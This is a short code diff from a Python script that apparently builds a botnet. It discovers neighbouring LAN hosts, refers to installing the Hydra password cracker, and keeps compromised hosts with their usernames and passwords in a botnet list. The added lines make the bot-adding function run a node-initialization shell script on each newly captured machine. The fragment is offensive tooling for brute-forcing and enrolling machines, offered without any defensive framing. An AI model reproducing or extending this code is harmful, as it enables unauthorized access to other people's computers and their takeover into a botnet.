@@ -64,7 +64,7 @@ def get_neighbor():
         neighbors.append(ip)
     neighbors.remove('10.150.0.7')
     print(neighbors)
-    
+
     return neighbors
 
 #sudo apt-get install hydra hydra-gtk
@@ -88,6 +88,9 @@ def hydra(hosts):
 botnet = []
 def add_bot(host, user, password):
     new_bot = Bot(host, user, password)
+    output = subprocess.Popen(['./initialize_new_node.sh'], stdout = subprocess.PIPE)
+    response = output.communicate()[0]
+    str_res = response.decode("utf-8")
     botnet.append(new_bot)
 #local_lan_ip = get_lan_ip
 #user = subprocess.check_output(['whoami'])
